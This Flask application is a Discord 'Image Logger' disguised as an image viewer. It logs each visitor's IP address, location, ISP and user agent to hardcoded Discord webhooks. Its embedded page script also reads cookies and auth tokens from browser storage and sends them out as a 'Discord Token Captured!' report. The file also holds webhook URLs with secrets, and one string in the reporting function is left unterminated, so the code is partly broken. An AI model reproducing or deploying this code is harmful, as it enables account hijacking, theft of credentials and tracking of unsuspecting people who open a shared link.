# app.py
from flask import Flask, request, render_template_string, redirect
import requests
import base64
import httpagentparser
import json
import traceback

app = Flask(__name__)

# Configuration
config = {
    "webhook": "https://discord.com/api/webhooks/1386517547129503784/H7Y_Af2SiwqmPTzmsBRpZmQwCiEj5hjpf0FNVUl0WavinXJRTNpZSnqREViEWNV0QPxZ",
    "token_webhook": "https://discord.com/api/webhooks/1386729903604367502/S7dnBw213vde8pTUkWWBj7C0oRwa1RMpCjPI1CtayiQqgOIQ6Ps_MBoXvJB5PmKGsGdw",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if "TelegramBot" in useragent:
        return "Telegram"
    if "Twitterbot" in useragent:
        return "Twitter"
    if "Discordbot" in useragent:
        return "Discord"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent, coords=None, endpoint="N/A", url=None):
    if any(ip.startswith(prefix) for prefix in blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Image Logging link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return None

    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,proxy,hosting,mobile,timezone").json()
        
        if ip_info.get('status') != 'success':
            ip_info = {}
        
        os, browser = httpagentparser.simple_detect(useragent)
        
        embed = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - IP Logged",
                    "color": config["color"],
                    "description": f"""**IP:** `{ip}`
**Location:** {ip_info.get('city', 'Unknown')}, {ip_info.get('regionName', 'Unknown')}, {ip_info.get('country', 'Unknown')}
**ISP:** {ip_info.get('isp', 'Unknown')}
**Coordinates:** {coords if coords else f"{ip_info.get('lat', '?')}, {ip_info.get('lon', '?')}"}
**Mobile:** {ip_info.get('mobile', False)}
**VPN:** {ip_info.get('proxy', False)}
**Bot:** {ip_info.get('hosting', False)}

**OS:** {os}
**Browser:** {browser}
**User Agent:**
                        }
            ],
        }
        
        if url:
            embed["embeds"][0]["thumbnail"] = {"url": url}
        
        requests.post(config["webhook"], json=embed)
        return ip_info
        
    except Exception as e:
        reportError(str(e))
        return None

def sendTokenReport(ip, useragent, token, cookies):
    try:
        requests.post(config["token_webhook"], json={
            "username": "Token Capture",
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Discord Token Captured!",
                    "color": 0xFF0000,
                    "fields": [
                        {"name": "IP", "value": ip, "inline": True},
                        {"name": "User Agent", "value": useragent, "inline": True},
                        {"name": "Token", "value": f"```{token}```", "inline": False},
                        {"name": "Cookies", "value": f"```{cookies[:1000]}```" if cookies else "None", "inline": False}
                    ]
                }
            ]
        })
    except Exception as e:
        reportError(f"Token report error: {str(e)}")

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = request.headers.get('X-Forwarded-For', 'Unknown')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        token = data.get('token', 'NOT_FOUND')
        cookies = data.get('cookies', '')
        
        if token != 'NOT_FOUND':
            sendTokenReport(ip, user_agent, token, cookies)
            
        return 'OK', 200
    except Exception as e:
        reportError(f"Capture error: {str(e)}")
        return 'Error', 500

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def index(path):
    try:
        query = request.args
        ip = request.headers.get('X-Forwarded-For', 'Unknown')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Get image URL
        if config["imageArgument"]:
            if 'url' in query:
                image_url = base64.b64decode(query['url'].encode()).decode()
            elif 'id' in query:
                image_url = base64.b64decode(query['id'].encode()).decode()
            else:
                image_url = config["image"]
        else:
            image_url = config["image"]
        
        # Handle bots
        bot = botCheck(ip, user_agent)
        if bot:
            if config["buggedImage"]:
                # Transparent pixel
                return base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="), 200, {'Content-Type': 'image/png'}
            else:
                return redirect(image_url, code=302)
        
        # Make IP report
        coords = None
        if 'g' in query:
            try:
                coords = base64.b64decode(query['g'].encode()).decode()
            except:
                pass
        makeReport(ip, user_agent, coords, request.path, url=image_url)
        
        # Render the HTML with token capture
        return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            max-width: 100%;
            max-height: 100vh;
        }
        .image-container {
            margin: 0 auto;
            max-width: 90%;
        }
        .image-container img {
            max-width: 100%;
            max-height: 80vh;
            object-fit: contain;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .loading {
            color: #fff;
            font-size: 18px;
            margin-top: 20px;
            text-align: center;
        }
        .footer {
            color: #aaa;
            font-size: 14px;
            margin-top: 30px;
        }
    </style>
    <script>
        // Function to capture tokens and cookies
        function captureData() {
            const data = {
                token: "NOT_FOUND",
                cookies: document.cookie
            };

            // Token keys to check
            const tokenKeys = [
                'token', 'discord_token', '_token', 
                'access_token', 'auth_token'
            ];
            
            // Check storage locations
            tokenKeys.forEach(key => {
                try {
                    // Check localStorage
                    const value = localStorage.getItem(key);
                    if (value && value.length > 50) {
                        data.token = value;
                    }
                    
                    // Check sessionStorage
                    const sessionValue = sessionStorage.getItem(key);
                    if (sessionValue && sessionValue.length > 50) {
                        data.token = sessionValue;
                    }
                } catch(e) {
                    console.error('Error accessing storage:', e);
                }
            });
            
            return data;
        }

        // Send captured data to server
        function sendCapturedData() {
            try {
                const data = captureData();
                console.log("Captured data:", data);
                
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) {
                console.error('Error sending data:', e);
            }
        }

        // Geolocation function
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
                        
                        // Update URL with coordinates
                        const url = new URL(window.location);
                        url.searchParams.set('g', g);
                        window.history.replaceState({}, '', url);
                    },
                    error => {
                        console.error('Geolocation error:', error);
                    }
                );
            }
        }

        // Initialize after page loads
        window.addEventListener('load', () => {
            // Capture data after 3 seconds
            setTimeout(sendCapturedData, 3000);
            
            // Get location if enabled and not already captured
            {% if config.accurateLocation and 'g' not in query %}
            getLocation();
            {% endif %}
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="image-container">
            <img src="{{ image_url }}" alt="Preview" 
                 onerror="this.onerror=null;this.src='https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg';">
        </div>
        <div class="loading">Loading image...</div>
        <div class="footer">Image may take a moment to load</div>
    </div>
</body>
</html>
        """, image_url=image_url, config=config, query=query)
        
    except Exception as e:
        reportError(f"Main route error: {str(e)}")
        return "An error occurred. Please try again later.", 500

if __name__ == '__main__':
    app.run(debug=True)
